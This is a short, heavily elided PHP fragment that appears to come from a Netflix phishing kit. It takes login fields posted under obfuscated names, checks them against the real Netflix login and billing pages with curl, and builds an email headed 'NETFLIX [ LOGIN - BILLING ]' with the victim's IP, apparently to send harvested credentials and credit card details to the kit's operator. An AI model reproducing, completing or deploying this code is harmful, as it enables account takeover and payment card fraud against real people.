...
if (isset($_POST['xoooo']) && isset($_POST['XoooX']))
{
    ...
    $get_token = curl('https://www.netflix.com/login');
    ...
    else
    {
        ...
        $PaymentPage = curl('https://www.netflix.com/simplemember/editcredit');
        ...
        //--------- Credit Card
            ...
            $subject  = "NETFLIX [ LOGIN - BILLING ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: Crafrtman <Crafrs@man.io.i8>\r\n";
